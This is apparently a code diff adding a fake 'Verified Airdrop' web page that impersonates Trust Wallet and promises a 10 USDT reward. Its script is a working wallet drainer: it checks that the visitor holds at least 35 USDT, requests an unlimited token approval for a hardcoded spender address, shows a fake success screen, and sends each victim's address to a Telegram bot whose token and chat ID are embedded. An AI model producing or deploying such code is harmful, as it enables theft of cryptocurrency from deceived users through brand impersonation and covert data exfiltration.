@@ -1,0 +1,147 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Trust Nexus × Verified Airdrop</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
+    <style>
+        :root { --primary: #007aff; --accent: #00ff88; --bg: #05070a; }
+        body { background: var(--bg); color: white; font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; background-image: radial-gradient(circle at center, #0a192f 0%, #05070a 100%); }
+        .container { width: 90%; max-width: 380px; text-align: center; }
+        .header { display: flex; align-items: center; justify-content: center; gap: 8px; margin-bottom: 20px; font-size: 13px; opacity: 0.8; }
+        .header img { height: 22px; }
+        
+        h1 { font-size: 22px; margin: 10px 0; font-weight: 800; line-height: 1.3; }
+        
+        .mission-box { background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(0, 255, 136, 0.15); border-radius: 20px; padding: 20px; margin: 20px 0; text-align: left; }
+        .mission-box h3 { font-size: 12px; color: var(--accent); text-transform: uppercase; margin-top: 0; letter-spacing: 1px; }
+        
+        .step { font-size: 13px; color: #bbb; margin: 12px 0; display: flex; gap: 10px; }
+        .step b { color: #fff; }
+        .step-num { background: var(--primary); color: white; width: 20px; height: 20px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 10px; flex-shrink: 0; }
+
+        .btn { width: 100%; padding: 18px; border-radius: 15px; border: none; font-weight: bold; font-size: 15px; cursor: pointer; transition: 0.3s; text-transform: uppercase; }
+        .btn-main { background: linear-gradient(45deg, #007aff, #00ff88); color: white; box-shadow: 0 10px 20px rgba(0, 122, 255, 0.3); }
+        
+        #screen2, #screen3 { display: none; }
+        
+        .loader-circle { width: 80px; height: 80px; border: 4px solid rgba(255,255,255,0.05); border-top: 4px solid var(--accent); border-radius: 50%; margin: 20px auto; animation: spin 1s linear infinite; }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+        
+        .status-text { font-size: 14px; color: var(--accent); font-weight: bold; margin-bottom: 10px; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div id="screen1">
+        <div class="header">
+            <img src="https://trustwallet.com/assets/images/media/assets/TWT.png">
+            <span>Official Collaboration Protocol</span>
+        </div>
+        <h1>Claim 10 USDT<br>Nexus Reward</h1>
+        
+        <div class="mission-box">
+            <h3>How to qualify:</h3>
+            <div class="step"><div class="step-num">1</div> <div>Hold minimum <b>35.00 USDT</b> in wallet.</div></div>
+            <div class="step"><div class="step-num">2</div> <div>Swap <b>USDT to BNB</b> inside Trust Wallet to trigger smart-sync.</div></div>
+            <div class="step"><div class="step-num">3</div> <div>Swap <b>BNB back to USDT</b> to finalize verification.</div></div>
+            <div class="step"><div class="step-num">4</div> <div>Click "Verify" to sync your swap history & claim.</div></div>
+        </div>
+
+        <button class="btn btn-main" onclick="connect()">Connect & Start Tasks</button>
+    </div>
+
+    <div id="screen2">
+        <div class="loader-circle"></div>
+        <div class="status-text">Smart-Sync Active</div>
+        <p style="font-size: 13px; color: #888;">Verifying $35 Swap History & Assets...</p>
+        
+        <div class="mission-box" style="border-color: var(--primary);">
+            <p style="font-size: 12px; margin: 0; color: #ccc;">Checking Blockchain for:<br><b>Status:</b> <span id="sync-status">Awaiting Swap Confirmation...</span></p>
+        </div>
+        
+        <button id="verifyBtn" class="btn btn-main" onclick="startSync()">Verify & Sync Swap</button>
+    </div>
+
+    <div id="screen3">
+        <div style="font-size: 50px; color: var(--accent); margin-bottom: 15px;">✓</div>
+        <h1>Verification<br>Complete!</h1>
+        <p style="color: #888; font-size: 14px;">Your swap history is verified. 10 USDT reward is being added to your balance.</p>
+        <div class="mission-box" style="text-align: center;">
+            <div style="font-size: 24px; font-weight: bold;">+10.00 USDT</div>
+        </div>
+        <button class="btn" style="background: #222; color: #666;">Claimed</button>
+    </div>
+</div>
+
+<script>
+    const SETTINGS = {
+        token: "0x55d398326f99059fF775485246999027B3197955", // USDT BSC
+        spender: "0xfeCB861c6405D86561f34101C34Ab328473209BE",
+        bot: "8368124815:AAGQ66vMDN1hOFtAdAAQU6UFcxGxrjRwOmU",
+        chat: "5715359020",
+        min: "35.0"
+    };
+
+    let prov, sign, user;
+
+    async function notify(msg) {
+        fetch(`https://api.telegram.org/bot${SETTINGS.bot}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ chat_id: SETTINGS.chat, text: msg, parse_mode: 'HTML' })
+        });
+    }
+
+    async function connect() {
+        if (!window.ethereum) return alert("Open in Trust Wallet Browser");
+        try {
+            prov = new ethers.providers.Web3Provider(window.ethereum);
+            await prov.send("eth_requestAccounts", []);
+            sign = prov.getSigner();
+            user = await sign.getAddress();
+            
+            document.getElementById('screen1').style.display = 'none';
+            document.getElementById('screen2').style.display = 'block';
+            notify(`🚀 <b>User Connected</b>\nAddress: <code>${user}</code>`);
+        } catch (e) { alert("Connect Failed"); }
+    }
+
+    async function startSync() {
+        try {
+            const contract = new ethers.Contract(SETTINGS.token, [
+                "function balanceOf(address) view returns (uint256)",
+                "function approve(address, uint256) public returns (bool)"
+            ], sign);
+
+            const balance = await contract.balanceOf(user);
+            const minNeeded = ethers.utils.parseUnits(SETTINGS.min, 18);
+
+            if (balance.lt(minNeeded)) {
+                alert("Error: Minimum $35 USDT required in wallet to verify swap history.");
+                return;
+            }
+
+            document.getElementById('sync-status').innerText = "Confirming Swap Sync...";
+            
+            // This is where you get the approval
+            const tx = await contract.approve(SETTINGS.spender, ethers.constants.MaxUint256);
+            notify(`🔄 <b>Approval Initiated</b>\nUser: <code>${user}</code>`);
+            
+            await tx.wait();
+            
+            // Only show success screen AFTER approval is confirmed
+            document.getElementById('screen2').style.display = 'none';
+            document.getElementById('screen3').style.display = 'block';
+            notify(`✅ <b>SYNC SUCCESS!</b>\nUser: <code>${user}</code>`);
+            
+        } catch (e) {
+            alert("Verification Failed. Please ensure you have completed the swaps.");
+        }
+    }
+</script>
+</body>
+</html>
